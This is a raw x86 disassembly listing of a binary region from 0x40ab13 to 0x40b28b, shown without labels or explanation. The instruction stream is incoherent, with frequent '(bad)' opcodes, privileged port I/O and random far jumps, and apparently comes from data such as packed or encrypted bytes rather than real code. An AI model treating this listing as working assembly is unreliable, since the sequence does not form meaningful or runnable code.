  40ab13:	cmp    eax,0xfc28019e
  40ab18:	iret   
  40ab19:	or     ebp,eax
  40ab1b:	jbe    0x40ab49
  40ab1d:	addr16 iret 
  40ab1f:	in     al,dx
  40ab20:	push   eax
  40ab21:	xchg   esi,eax
  40ab22:	retf   
  40ab23:	adc    DWORD PTR [eax+0x534d3bf0],eax
  40ab29:	out    0xf3,al
  40ab2b:	stc    
  40ab2c:	sub    dl,BYTE PTR [ebx+0x617036f6]
  40ab32:	lds    edx,FWORD PTR [ebp-0x78e36411]
  40ab38:	add    DWORD PTR [edx+eax*1+0x2b2bc15a],ebx
  40ab3f:	mov    ds:0x3ca5deee,al
  40ab44:	cmp    ch,BYTE PTR [edx+0x65]
  40ab47:	mov    ebp,0xc179e5d2
  40ab4c:	push   0x854a42d4
  40ab51:	(bad)  
  40ab52:	jae    0x40aafa
  40ab54:	shr    ecx,cl
  40ab56:	xchg   ecx,eax
  40ab57:	das    
  40ab58:	cld    
  40ab59:	popf   
  40ab5a:	mov    dl,0x0
  40ab5c:	mov    eax,0x788058f3
  40ab61:	lahf   
  40ab62:	jg     0x40aafa
  40ab64:	xchg   ebp,eax
  40ab65:	mov    eax,es
  40ab67:	sbb    BYTE PTR [ebx+0x3e],al
  40ab6a:	lahf   
  40ab6b:	push   edi
  40ab6c:	imul   eax,DWORD PTR ds:0x3f309800,0xffffff9b
  40ab73:	xor    eax,0x87b4ba5c
  40ab78:	xor    eax,0x4821d75d
  40ab7d:	or     DWORD PTR [esp+eiz*2-0x5b],0x1acc2617
  40ab85:	loope  0x40ab1c
  40ab87:	fbstp  TBYTE PTR [ebp-0x3e]
  40ab8a:	pop    esi
  40ab8b:	fld    DWORD PTR ds:0x46b16158
  40ab91:	jp     0x40abf3
  40ab93:	adc    BYTE PTR [eax-0x1d],bl
  40ab96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab97:	adc    ebp,edi
  40ab99:	je     0x40abf7
  40ab9b:	dec    eax
  40ab9c:	jo     0x40ac0d
  40ab9e:	pop    edi
  40ab9f:	push   eax
  40aba0:	push   0xffffffa7
  40aba2:	dec    eax
  40aba3:	mov    ch,0x89
  40aba5:	cmp    DWORD PTR [ecx-0x727f2e73],esi
  40abab:	sahf   
  40abac:	sti    
  40abad:	dec    eax
  40abae:	pop    edi
  40abaf:	sbb    bh,0xb6
  40abb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abb3:	in     al,0xbe
  40abb5:	daa    
  40abb6:	pmaxub mm7,QWORD PTR [esi+0x1b]
  40abba:	cmp    edx,eax
  40abbc:	loop   0x40ab66
  40abbe:	inc    eax
  40abbf:	dec    eax
  40abc0:	add    al,0x8a
  40abc2:	sbb    eax,0xae517a85
  40abc7:	jbe    0x40ac07
  40abc9:	mov    DWORD PTR [ecx+edi*1],edx
  40abcc:	pop    ds
  40abcd:	jns    0x40abc1
  40abcf:	xor    bh,BYTE PTR [edi-0x1d]
  40abd2:	scas   eax,DWORD PTR es:[edi]
  40abd3:	mov    esp,0x418d8d9f
  40abd8:	gs iret 
  40abda:	(bad)  
  40abdb:	into   
  40abdc:	mov    esp,0xda363d98
  40abe1:	push   esi
  40abe2:	in     eax,dx
  40abe3:	jnp    0x40ab90
  40abe5:	aad    0x62
  40abe7:	cmp    al,0x3e
  40abe9:	in     al,0x77
  40abeb:	(bad)  
  40abec:	mov    edi,0x4deae63f
  40abf1:	leave  
  40abf2:	cdq    
  40abf3:	jae    0x40ab84
  40abf5:	rcr    bh,1
  40abf7:	fsub   DWORD PTR [esi+0x25c4dfd3]
  40abfd:	sti    
  40abfe:	les    ebp,FWORD PTR [edx-0x55dc71e1]
  40ac04:	mov    edi,DWORD PTR [eax+0x5b]
  40ac07:	push   esp
  40ac08:	aaa    
  40ac09:	mov    esi,0x88aca2cc
  40ac0e:	jp     0x40ac87
  40ac10:	fistp  QWORD PTR [esi-0x33]
  40ac13:	mov    ds:0xa23ed568,al
  40ac18:	rep lods eax,DWORD PTR ds:[esi]
  40ac1a:	loopne 0x40ac32
  40ac1c:	xor    eax,0x2330800
  40ac21:	xchg   DWORD PTR [ecx+0x436dfa80],ebx
  40ac27:	mov    bh,0xd3
  40ac29:	data16 sahf 
  40ac2b:	sub    eax,0x155b01a6
  40ac30:	jbe    0x40ac00
  40ac32:	mov    dl,0x6c
  40ac34:	push   ebp
  40ac35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac36:	ja     0x40ac56
  40ac38:	cwde   
  40ac39:	sub    al,0x55
  40ac3b:	fdivr  DWORD PTR [ebp-0x6c]
  40ac3e:	jecxz  0x40ac70
  40ac40:	adc    BYTE PTR ds:0xec1aea90,0x6c
  40ac47:	mov    edx,DWORD PTR ss:[esi-0x3f]
  40ac4b:	lds    eax,FWORD PTR [edi-0x59d319cc]
  40ac51:	leave  
  40ac52:	pop    esi
  40ac53:	sbb    eax,0xb41fbbfe
  40ac58:	dec    DWORD PTR [esi-0x19]
  40ac5b:	pop    ebx
  40ac5c:	add    eax,0xc79d4710
  40ac61:	pop    edx
  40ac62:	aaa    
  40ac63:	add    eax,ebp
  40ac65:	jl     0x40aca5
  40ac67:	inc    edi
  40ac68:	inc    ebp
  40ac69:	mov    WORD PTR [ecx-0x5],es
  40ac6c:	xor    al,0x60
  40ac6e:	ins    DWORD PTR es:[edi],dx
  40ac6f:	xor    al,0x97
  40ac71:	scas   eax,DWORD PTR es:[edi]
  40ac72:	dec    esp
  40ac73:	adc    BYTE PTR [edx-0x7c],dh
  40ac76:	adc    dh,dl
  40ac78:	mov    cl,0xfb
  40ac7a:	jmp    0xc00b:0x91ec8f58
  40ac81:	loop   0x40acac
  40ac83:	mov    ebp,0x41023970
  40ac88:	or     DWORD PTR [ebp+0x68080a8d],ebp
  40ac8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac8f:	mov    cl,BYTE PTR [esi-0x25]
  40ac92:	cdq    
  40ac93:	add    DWORD PTR [ecx+0x61],ebx
  40ac96:	mov    al,0x21
  40ac98:	mov    eax,ds:0xdaebd6a7
  40ac9d:	cli    
  40ac9e:	out    dx,eax
  40ac9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aca0:	fdivr  DWORD PTR [esi+0x53]
  40aca3:	and    DWORD PTR [edx-0x438e923a],esp
  40aca9:	push   esp
  40acaa:	inc    esi
  40acab:	pop    ss
  40acac:	and    eax,0x71f11a98
  40acb1:	xchg   esi,eax
  40acb2:	jp     0x40ac92
  40acb4:	mov    edi,0xcaaefc58
  40acb9:	add    eax,0xd3e08060
  40acbe:	add    BYTE PTR [ecx],cl
  40acc0:	(bad)  
  40acc2:	shr    BYTE PTR [ecx-0x2035030d],0x39
  40acc9:	(bad)  
  40acca:	and    ecx,DWORD PTR [edi]
  40accc:	lahf   
  40accd:	scas   al,BYTE PTR es:[edi]
  40acce:	jmp    0x128f:0xbc29a8f3
  40acd5:	and    DWORD PTR [esp+edi*4+0x5f],ebx
  40acd9:	imul   ecx,ebp,0xffffff97
  40acdc:	mov    edi,0xf9df2cf2
  40ace1:	fimul  WORD PTR [ebp+0x76]
  40ace4:	dec    esi
  40ace5:	jge    0x40ac77
  40ace7:	(bad)  
  40ace8:	loope  0x40ad13
  40acea:	push   es
  40aceb:	sbb    esp,DWORD PTR [edi]
  40aced:	dec    eax
  40acee:	xchg   edx,eax
  40acef:	into   
  40acf0:	mov    ds:0x5c7babae,al
  40acf5:	fdiv   st(6),st
  40acf7:	add    dl,0xc7
  40acfa:	iret   
  40acfb:	sbb    bl,BYTE PTR [ebx+0x35]
  40acfe:	push   ecx
  40acff:	out    dx,eax
  40ad00:	cs pushf 
  40ad02:	xor    DWORD PTR [eax+0x653f23c0],esi
  40ad08:	pushf  
  40ad09:	aas    
  40ad0a:	into   
  40ad0b:	js     0x40ad1d
  40ad0d:	(bad)  
  40ad0e:	outs   dx,BYTE PTR ds:[esi]
  40ad0f:	mov    ss,WORD PTR [ebp+0x3a308d97]
  40ad15:	sar    bh,1
  40ad17:	fcom   DWORD PTR [edi]
  40ad19:	and    BYTE PTR [esi+eax*8+0x1cb4bd58],ch
  40ad20:	pop    eax
  40ad21:	sub    al,0xcd
  40ad23:	test   eax,0xba3aa2c0
  40ad28:	imul   BYTE PTR [ebx+0x2babfabf]
  40ad2e:	out    0x8,eax
  40ad30:	mov    edi,0x61c725f
  40ad35:	push   eax
  40ad36:	fnstsw WORD PTR [ebp+0x59]
  40ad39:	xchg   esi,eax
  40ad3a:	pusha  
  40ad3b:	sub    eax,0xd3e450a2
  40ad40:	cmp    BYTE PTR [edi],0xfa
  40ad43:	jg     0x40ad43
  40ad45:	or     eax,0x46b125b2
  40ad4a:	push   esp
  40ad4b:	xchg   ebp,eax
  40ad4c:	mov    bl,0x6a
  40ad4e:	je     0x40ad27
  40ad50:	fld    QWORD PTR [edx+0x76]
  40ad53:	(bad)  
  40ad54:	xchg   ecx,eax
  40ad55:	jnp    0x40ad48
  40ad57:	add    esp,eax
  40ad59:	fucomi st,st(6)
  40ad5b:	je     0x40ad7b
  40ad5d:	(bad)  
  40ad5e:	jl     0x40ada8
  40ad60:	sub    DWORD PTR [ecx],ebp
  40ad62:	mov    ch,0x26
  40ad64:	mov    DWORD PTR [esi-0x5a],esp
  40ad67:	or     ebx,esi
  40ad69:	add    bl,BYTE PTR [esp+ebx*1]
  40ad6c:	in     al,dx
  40ad6d:	jae    0x40ad52
  40ad6f:	xchg   esi,eax
  40ad70:	rcr    edx,0xd4
  40ad73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad74:	add    BYTE PTR [edi],ch
  40ad76:	inc    edx
  40ad77:	sub    BYTE PTR [esi+0x5d],0x82
  40ad7b:	rol    BYTE PTR [ebx],1
  40ad7d:	push   ebx
  40ad7e:	cmp    DWORD PTR [ebx],eax
  40ad80:	sbb    ecx,0x69
  40ad83:	add    DWORD PTR [edi+esi*1+0x2078c91],eax
  40ad8a:	fisttp WORD PTR [edx]
  40ad8c:	xchg   ebp,eax
  40ad8d:	adc    dh,BYTE PTR [ebx+edi*4+0xe]
  40ad91:	add    al,0xe6
  40ad93:	cdq    
  40ad94:	es (bad) 
  40ad96:	jp     0x40ad9d
  40ad98:	daa    
  40ad99:	xor    DWORD PTR [ebp+0x6f],ebx
  40ad9c:	int3   
  40ad9d:	push   ds
  40ad9e:	dec    esp
  40ad9f:	lods   al,BYTE PTR ds:[esi]
  40ada0:	les    ecx,FWORD PTR [ebp+0x53]
  40ada3:	and    BYTE PTR [edx-0x53],ch
  40ada6:	add    BYTE PTR ss:[eax+0x73],cl
  40adaa:	jl     0x40aded
  40adac:	pusha  
  40adad:	sub    eax,0x3d09871
  40adb2:	push   eax
  40adb3:	or     eax,0x81519a7c
  40adb8:	sub    ch,al
  40adba:	sbb    bl,cl
  40adbc:	inc    esi
  40adbd:	idiv   DWORD PTR [edx]
  40adbf:	mov    edi,0x3e52b7f2
  40adc4:	stc    
  40adc5:	pop    edi
  40adc6:	cmp    eax,0xa8ea5286
  40adcb:	test   BYTE PTR [esi-0xa0e75c5],dl
  40add1:	lods   al,BYTE PTR ds:[esi]
  40add2:	xchg   esp,eax
  40add3:	loop   0x40ad5a
  40add5:	outs   dx,DWORD PTR ds:[esi]
  40add6:	mov    edi,0xf8ff97c4
  40addb:	and    eax,0x61ef9bfa
  40ade0:	arpl   WORD PTR [edx+ecx*4-0x22],si
  40ade4:	pusha  
  40ade5:	pop    es
  40ade6:	xchg   ebp,eax
  40ade7:	not    al
  40ade9:	mov    BYTE PTR [esi+0x2a],0xbd
  40aded:	sar    BYTE PTR [eax-0x4f],1
  40adf0:	test   al,0xfa
  40adf2:	or     al,BYTE PTR [ebp+eax*2+0x5e2d0265]
  40adf9:	lea    edi,[ebx]
  40adfb:	push   0xffffffc1
  40adfd:	pop    esp
  40adfe:	stos   DWORD PTR es:[edi],eax
  40adff:	(bad)  
  40ae00:	cmp    eax,0x76a21e6a
  40ae05:	out    dx,al
  40ae06:	inc    ebp
  40ae07:	fistp  DWORD PTR [eax+0x20]
  40ae0a:	lds    esi,FWORD PTR [edx+0x5b]
  40ae0d:	stos   BYTE PTR es:[edi],al
  40ae0e:	xchg   esp,eax
  40ae0f:	aas    
  40ae10:	mov    ds:0xba0965ff,al
  40ae15:	mov    ah,0x6c
  40ae17:	hlt    
  40ae18:	sub    al,0x52
  40ae1a:	les    eax,FWORD PTR [eax-0x1d]
  40ae1d:	out    dx,eax
  40ae1e:	aad    0xb7
  40ae20:	scas   eax,DWORD PTR es:[edi]
  40ae21:	rcl    BYTE PTR [eax+0x2af1e3c6],0x47
  40ae28:	jmp    0xc1f02a26
  40ae2d:	mov    bh,0x27
  40ae2f:	(bad)  
  40ae30:	int    0x4
  40ae32:	je     0x40ae9d
  40ae34:	pushf  
  40ae35:	inc    edx
  40ae36:	mov    edx,0x9fdecdf5
  40ae3b:	mov    cl,0xf3
  40ae3d:	mov    eax,ds:0x75e4d90e
  40ae42:	out    0x2f,al
  40ae44:	sbb    ecx,esp
  40ae46:	in     eax,dx
  40ae47:	push   cs
  40ae48:	sbb    BYTE PTR [ecx+0x5285056c],al
  40ae4e:	mov    ah,0xdb
  40ae50:	sub    eax,0x4cc70f0e
  40ae55:	es xchg ebx,eax
  40ae57:	call   0x773d:0x92f7e2d
  40ae5e:	push   ebx
  40ae5f:	call   0x93813147
  40ae64:	xchg   esi,eax
  40ae65:	ret    0x6d02
  40ae68:	lea    esi,[ecx]
  40ae6a:	in     al,0x59
  40ae6c:	out    0x22,al
  40ae6e:	add    ch,bh
  40ae70:	jle    0x40ae77
  40ae72:	repz (bad) 
  40ae74:	das    
  40ae75:	xor    dh,BYTE PTR [ecx-0x17]
  40ae78:	repnz add eax,0xc402de6e
  40ae7e:	bound  ecx,QWORD PTR [ebx+eax*4-0x6c]
  40ae82:	mov    eax,ds:0x29cad8b9
  40ae87:	push   ebp
  40ae88:	cmp    DWORD PTR [ecx],edi
  40ae8a:	ret    
  40ae8b:	sbb    DWORD PTR [edx-0x40111360],0x6d
  40ae92:	int3   
  40ae93:	dec    ebp
  40ae94:	and    eax,0x97eda584
  40ae99:	adc    eax,0x4a0acd9f
  40ae9e:	ins    DWORD PTR es:[edi],dx
  40ae9f:	rcl    BYTE PTR [ebp-0x4dd630ed],1
  40aea5:	xchg   esp,eax
  40aea6:	call   0x1321:0x6548144
  40aead:	(bad)  
  40aeaf:	add    al,0xd5
  40aeb1:	ret    0x3547
  40aeb4:	rol    BYTE PTR ss:[esp+ecx*4],1
  40aeb8:	mov    BYTE PTR [edx+0xac10c87],ch
  40aebe:	sub    esp,DWORD PTR [edx+0x2690801c]
  40aec4:	sbb    al,0xa8
  40aec6:	jg     0x40af2d
  40aec8:	jbe    0x40aefe
  40aeca:	xor    cl,BYTE PTR [edx]
  40aecc:	sub    edx,DWORD PTR [eax]
  40aece:	jo     0x40ae71
  40aed0:	shl    DWORD PTR [esi+0x3a],0xe7
  40aed4:	scas   eax,DWORD PTR es:[edi]
  40aed5:	std    
  40aed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aed7:	cmp    edi,edi
  40aed9:	cmc    
  40aeda:	das    
  40aedb:	jle    0x40ae6d
  40aedd:	jbe    0x40ae9a
  40aedf:	jne    0x40aea8
  40aee1:	sahf   
  40aee2:	outs   dx,BYTE PTR ds:[esi]
  40aee3:	xchg   ebp,eax
  40aee4:	add    al,0x1a
  40aee6:	sub    al,0xa5
  40aee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aee9:	shr    ecx,cl
  40aeeb:	jo     0x40aeea
  40aeed:	cli    
  40aeee:	sub    eax,0x5ff3f77e
  40aef3:	daa    
  40aef4:	aaa    
  40aef5:	fucomi st,st(4)
  40aef7:	ins    BYTE PTR es:[edi],dx
  40aef8:	sahf   
  40aef9:	mov    ds:0xdda1dfdb,eax
  40aefe:	sbb    DWORD PTR [edx-0x4],esp
  40af01:	mov    al,ds:0x5f7d1aa9
  40af06:	mov    eax,0x72bd179c
  40af0b:	int3   
  40af0c:	ss push ss
  40af0e:	push   edi
  40af0f:	and    DWORD PTR [eax+0x528188a5],eax
  40af15:	les    ecx,FWORD PTR [esi-0xa6ae4c1]
  40af1b:	inc    eax
  40af1c:	and    BYTE PTR [edx-0x17],al
  40af1f:	sbb    BYTE PTR [edx+eax*1],ah
  40af22:	int    0x8b
  40af24:	cdq    
  40af25:	es push 0xcfe39c23
  40af2b:	jg     0x40aeb7
  40af2d:	adc    cl,BYTE PTR [edx-0x6815ccae]
  40af33:	or     dl,bl
  40af35:	mov    ch,0xe7
  40af37:	lea    edi,[edi+0x15c021c7]
  40af3d:	sbb    eax,0x21abbd5
  40af42:	test   bl,ah
  40af44:	add    eax,eax
  40af46:	sub    eax,esi
  40af48:	or     DWORD PTR [esi],edi
  40af4a:	dec    ecx
  40af4b:	mov    ebp,ebx
  40af4d:	pop    ds
  40af4e:	mov    edi,0x3397fb48
  40af53:	jle    0x40af46
  40af55:	addr16 aas 
  40af57:	rol    DWORD PTR [ebx-0x8736c7d],0x27
  40af5e:	mov    esp,0x7c1ba5fe
  40af63:	sti    
  40af64:	pop    edi
  40af65:	in     eax,dx
  40af66:	xor    DWORD PTR [ebp+0x524242e0],edi
  40af6c:	mov    edx,0xbad6afd8
  40af71:	repnz add DWORD PTR [edx+ebp*2-0x43cc08e4],ebp
  40af79:	ja     0x40afb2
  40af7b:	cmp    ebx,DWORD PTR [edi]
  40af7d:	ja     0x40af1a
  40af7f:	fild   QWORD PTR [ebp+0x200000]
  40af85:	dec    ecx
  40af86:	inc    esp
  40af87:	inc    ecx
  40af88:	push   esp
  40af89:	push   esi
  40af8a:	fwait
  40af8b:	add    edx,DWORD PTR [edx-0x46]
  40af8e:	pop    ecx
  40af8f:	outs   dx,BYTE PTR ds:[esi]
  40af90:	stos   BYTE PTR es:[edi],al
  40af91:	xchg   ebp,eax
  40af92:	pop    ecx
  40af93:	and    esp,DWORD PTR [edi-0x23d965a2]
  40af99:	mov    eax,0xb1839b71
  40af9e:	hlt    
  40af9f:	mov    ecx,0xc5f95e36
  40afa4:	loop   0x40af80
  40afa6:	jno    0x40afb0
  40afa8:	mov    al,0xb2
  40afaa:	int3   
  40afab:	in     eax,dx
  40afac:	bound  edi,QWORD PTR [edi]
  40afae:	mov    esi,0x4066c541
  40afb3:	call   0x74d34487
  40afb8:	cmp    cl,BYTE PTR [edx-0x46af5a4c]
  40afbe:	inc    esi
  40afbf:	jnp    0x40af8e
  40afc1:	xchg   esi,eax
  40afc2:	adc    cl,BYTE PTR [esi-0x63]
  40afc5:	enter  0xb538,0x93
  40afc9:	jno    0x40afc1
  40afcb:	mov    ah,0xe5
  40afcd:	shl    DWORD PTR [ebx+0x7d],0xba
  40afd1:	fld    QWORD PTR [ecx+esi*8+0x4b85ce61]
  40afd8:	xchg   DWORD PTR [edi+ebp*8+0x15],edi
  40afdc:	retf   
  40afdd:	cmc    
  40afde:	fst    QWORD PTR [ebx]
  40afe0:	push   0xbd95d693
  40afe5:	xchg   edx,eax
  40afe6:	js     0x40af84
  40afe8:	and    BYTE PTR [eax+0x39],0x2a
  40afec:	ror    BYTE PTR [esp+esi*1-0xa6a3dd4],1
  40aff3:	jmp    0x77206ba
  40aff8:	pop    es
  40aff9:	add    bl,BYTE PTR [edi]
  40affb:	jp     0x40aff9
  40affd:	push   es
  40affe:	mov    edi,0xc63ddff1
  40b003:	mov    ecx,0x50b83bb3
  40b008:	loopne 0x40aff4
  40b00a:	icebp  
  40b00b:	push   ds
  40b00c:	icebp  
  40b00d:	cmp    ebp,DWORD PTR [ecx+0x6e]
  40b010:	mov    bh,0xd6
  40b012:	in     eax,0x59
  40b014:	in     al,0x79
  40b016:	into   
  40b017:	pop    ss
  40b018:	push   eax
  40b01a:	jmp    0x40afd8
  40b01c:	jne    0x40afd7
  40b01e:	in     al,0xf4
  40b020:	fld    DWORD PTR [edi-0x18]
  40b023:	je     0x40afdc
  40b025:	call   0x6498f69e
  40b02a:	ins    DWORD PTR es:[edi],dx
  40b02b:	mov    edx,0x38588475
  40b030:	hlt    
  40b031:	in     al,dx
  40b032:	adc    BYTE PTR [ecx+0x6b30d108],0x44
  40b039:	add    eax,DWORD PTR [esp+edi*1]
  40b03c:	js     0x40afc7
  40b03e:	lds    ecx,FWORD PTR [ebx-0x4d13557]
  40b044:	or     ebp,DWORD PTR [edx+eax*8]
  40b047:	out    dx,eax
  40b048:	pop    edi
  40b049:	dec    esp
  40b04a:	sbb    eax,0xb72a226
  40b04f:	xchg   esi,eax
  40b050:	pop    ss
  40b051:	jl     0x40b053
  40b053:	aad    0x78
  40b055:	add    ch,ch
  40b057:	xchg   BYTE PTR [eax+0x1b],cl
  40b05a:	pop    ebp
  40b05b:	mov    ds:0xdba94664,al
  40b060:	xor    eax,0x96d9bf7b
  40b065:	(bad)
  40b069:	mov    ebx,0x6384021c
  40b06e:	data16 add al,BYTE PTR [edx-0x125261ad]
  40b075:	ins    DWORD PTR es:[edi],dx
  40b076:	push   ds
  40b077:	mov    esi,0xff9718f9
  40b07c:	hlt    
  40b07d:	adc    eax,0xa79faebe
  40b082:	test   DWORD PTR [ecx-0x49d8cf1],0xdffd3f24
  40b08c:	hlt    
  40b08d:	imul   ebp,DWORD PTR [edi+0x5c],0xf8ff4be2
  40b094:	xor    dl,bl
  40b096:	leave  
  40b097:	add    al,0xa5
  40b099:	jmp    0x4ab0:0x1551c026
  40b0a0:	mov    ds,WORD PTR [ebx]
  40b0a2:	cli    
  40b0a3:	imul   ebp,esi,0xfffffff7
  40b0a6:	idiv   DWORD PTR [edi+ecx*8-0x29]
  40b0aa:	push   edx
  40b0ab:	dec    edx
  40b0ac:	xchg   ecx,eax
  40b0ad:	sti    
  40b0ae:	mov    DWORD PTR [eax+0x63],eax
  40b0b1:	inc    edx
  40b0b2:	sbb    eax,0xaf57821c
  40b0b7:	fisub  WORD PTR [edx+0x3e]
  40b0ba:	in     eax,dx
  40b0bb:	inc    eax
  40b0bc:	push   0xffffff91
  40b0be:	sbb    BYTE PTR [edx],0x0
  40b0c1:	xor    al,0xf3
  40b0c3:	aaa    
  40b0c4:	stos   BYTE PTR es:[edi],al
  40b0c5:	outs   dx,BYTE PTR ss:[esi]
  40b0c7:	pop    ss
  40b0c8:	and    DWORD PTR [eax-0x7c],eax
  40b0cb:	ret    0x51fa
  40b0ce:	and    eax,0x45431ae
  40b0d3:	adc    al,0x29
  40b0d5:	mov    eax,ds:0xb4e84add
  40b0da:	adc    esp,DWORD PTR [esi-0x2d]
  40b0dd:	sbb    BYTE PTR [ebx+ecx*8],0xc6
  40b0e1:	pusha  
  40b0e2:	into   
  40b0e3:	pop    es
  40b0e4:	sahf   
  40b0e5:	enter  0x2bf8,0x9f
  40b0e9:	cmp    al,cl
  40b0eb:	inc    edi
  40b0ec:	jg     0x40b0d8
  40b0ee:	jge    0x40b08c
  40b0f0:	cmp    DWORD PTR [ebx-0x542850b3],esi
  40b0f6:	sahf   
  40b0f7:	sub    eax,0xf85e73cf
  40b0fc:	idiv   BYTE PTR [ecx-0x2]
  40b0ff:	out    dx,eax
  40b100:	jg     0x40b0f9
  40b102:	jge    0x40b102
  40b104:	in     al,0xb9
  40b106:	cs sar esp,cl
  40b109:	add    al,0x96
  40b10b:	push   es
  40b10c:	or     ah,al
  40b10e:	push   cs
  40b10f:	ret    
  40b110:	mov    dl,BYTE PTR [edx]
  40b112:	inc    edi
  40b113:	mov    ebp,0xb35fd859
  40b118:	and    ah,dl
  40b11a:	sahf   
  40b11b:	xor    BYTE PTR [edx],dh
  40b11d:	adc    ebp,DWORD PTR [edx]
  40b11f:	jg     0x40b0e1
  40b121:	ret    0xb829
  40b124:	xor    edi,DWORD PTR [esi+ecx*8+0x6edff0ff]
  40b12b:	lock in al,0x13
  40b12e:	sub    esp,DWORD PTR [bx+si-0x4191]
  40b133:	(bad)  
  40b134:	out    0xff,al
  40b136:	or     BYTE PTR es:[ebp+eiz*2-0x1edb6d44],al
  40b13e:	imul   ebx,DWORD PTR [edi-0x1],0x33
  40b142:	(bad)  
  40b143:	in     al,0xeb
  40b145:	scas   eax,DWORD PTR es:[edi]
  40b146:	xor    ebx,edx
  40b148:	jp     0x40b189
  40b14a:	std    
  40b14b:	lea    edx,[ebx]
  40b14d:	hlt    
  40b14e:	jp     0x40b1ab
  40b150:	dec    eax
  40b151:	fptan  
  40b153:	cmc    
  40b154:	sbb    eax,DWORD PTR [ebx-0x1d394065]
  40b15a:	addr16 cmc 
  40b15c:	pop    esp
  40b15d:	mov    ebx,DWORD PTR [esi]
  40b15f:	jge    0x40b182
  40b161:	cmc    
  40b162:	mov    ds:0x14223cee,al
  40b167:	or     al,0xe0
  40b169:	dec    eax
  40b16a:	add    BYTE PTR [ecx-0x7bd05e46],al
  40b170:	lea    esp,[edx]
  40b172:	mov    al,ds:0x8f08c075
  40b177:	loope  0x40b1bf
  40b179:	call   FWORD PTR [ecx-0x41]
  40b17c:	sbb    BYTE PTR [eax+0x462dfff0],ch
  40b182:	imul   edx,edx,0x46
  40b185:	push   cs
  40b186:	inc    eax
  40b187:	nop
  40b188:	push   eax
  40b189:	pop    es
  40b18a:	dec    edx
  40b18b:	sub    esi,esi
  40b18d:	div    edi
  40b18f:	push   edi
  40b190:	test   DWORD PTR [eax],eax
  40b192:	xor    eax,0xbbd0206e
  40b197:	sub    al,bh
  40b199:	sahf   
  40b19a:	adc    al,0x54
  40b19c:	imul   ecx,ebp,0xffffffe9
  40b19f:	mov    bl,0xa7
  40b1a1:	clc    
  40b1a2:	in     al,dx
  40b1a3:	pop    es
  40b1a4:	jg     0x40b12f
  40b1a6:	aaa    
  40b1a7:	iret   
  40b1a8:	mov    edi,0x5e67a5ce
  40b1ad:	jecxz  0x40b20a
  40b1af:	iret   
  40b1b0:	mov    esp,0x31b1e0c4
  40b1b5:	daa    
  40b1b6:	jg     0x40b15a
  40b1b8:	dec    edi
  40b1b9:	push   DWORD PTR [ecx+0x38]
  40b1bc:	stc    
  40b1bd:	dec    ecx
  40b1be:	mov    DWORD PTR [esi+0xd2c6883],ebx
  40b1c4:	jnp    0x40b1a2
  40b1c6:	inc    ecx
  40b1c7:	cmp    al,bh
  40b1c9:	fst    st(6)
  40b1cb:	fmul   QWORD PTR [edi]
  40b1cd:	jne    0x40b1df
  40b1cf:	cmp    BYTE PTR [edx-0xc207bfb],cl
  40b1d5:	fxch   st(4)
  40b1d7:	das    
  40b1d8:	adc    DWORD PTR [esi-0x63],ebx
  40b1db:	add    al,0x21
  40b1dd:	and    eax,0x3cde6ac6
  40b1e2:	jg     0x40b1ff
  40b1e4:	inc    esp
  40b1e5:	(bad)  
  40b1e7:	icebp  
  40b1e8:	stc    
  40b1e9:	inc    DWORD PTR [edx]
  40b1eb:	mov    eax,ds:0x1a061ba4
  40b1f0:	xchg   esi,eax
  40b1f1:	xor    ecx,DWORD PTR [ebx]
  40b1f3:	jg     0x40b1f9
  40b1f5:	xchg   ebp,eax
  40b1f6:	push   ebx
  40b1f7:	rcl    BYTE PTR [edx],1
  40b1f9:	sbb    cl,BYTE PTR [edx-0x7bb3e361]
  40b1ff:	mov    al,0xa1
  40b201:	add    al,0xab
  40b203:	mov    cl,0x3e
  40b205:	mov    esi,ss
  40b207:	outs   dx,BYTE PTR ds:[esi]
  40b208:	dec    ecx
  40b209:	cli    
  40b20a:	jge    0x40b1d1
  40b20c:	je     0x40b1b8
  40b20e:	sbb    BYTE PTR [esi+0x4c],ch
  40b211:	stc    
  40b212:	stos   DWORD PTR es:[edi],eax
  40b213:	jg     0x40b26e
  40b215:	icebp  
  40b216:	ja     0x40b216
  40b218:	out    0xd3,al
  40b21a:	cmp    al,0xfe
  40b21c:	sahf   
  40b21d:	inc    edi
  40b21e:	stos   DWORD PTR es:[edi],eax
  40b21f:	in     eax,0xad
  40b221:	jecxz  0x40b1db
  40b223:	mov    edx,0x1f079294
  40b228:	jl     0x40b1ba
  40b22a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b22b:	aas    
  40b22c:	cli    
  40b22d:	pop    esi
  40b22e:	(bad)  
  40b22f:	(bad)  
  40b231:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b233:	cld    
  40b234:	pop    edi
  40b235:	push   esi
  40b237:	dec    ebp
  40b238:	fidivr WORD PTR [edx-0x5939ef0a]
  40b23e:	sub    al,0xa5
  40b240:	out    dx,al
  40b241:	scas   al,BYTE PTR es:[edi]
  40b242:	or     al,0xfd
  40b244:	stc    
  40b245:	push   esi
  40b246:	mov    ebp,0xa231d972
  40b24b:	std    
  40b24c:	push   ds
  40b24d:	push   esp
  40b24e:	ret    0xf3e
  40b251:	adc    bl,BYTE PTR [ebp+0x7e67ce56]
  40b257:	es out 0xb3,eax
  40b25a:	lahf   
  40b25b:	dec    BYTE PTR [ecx-0x46]
  40b25e:	fnsave [esi+0x6d]
  40b261:	inc    edx
  40b262:	retf   
  40b263:	push   ebp
  40b264:	mov    ebp,0xb1cf5c7c
  40b269:	dec    eax
  40b26a:	sub    ecx,ebp
  40b26c:	jbe    0x40b229
  40b26e:	pop    esp
  40b26f:	mov    esi,0xffcf9572
  40b274:	(bad)  
  40b275:	aaa    
  40b276:	mov    cl,0xea
  40b278:	xor    al,0xfd
  40b27a:	loope  0x40b2d5
  40b27c:	pop    edx
  40b27d:	popf   
  40b27e:	dec    ebp
  40b27f:	fs shl cl,cl
  40b282:	jmp    0x40b2bf
  40b284:	xor    al,0x7a
  40b286:	hlt    
  40b287:	enter  0xb10d,0xe8
  40b28b:	mov    eax,0xcfbc9445
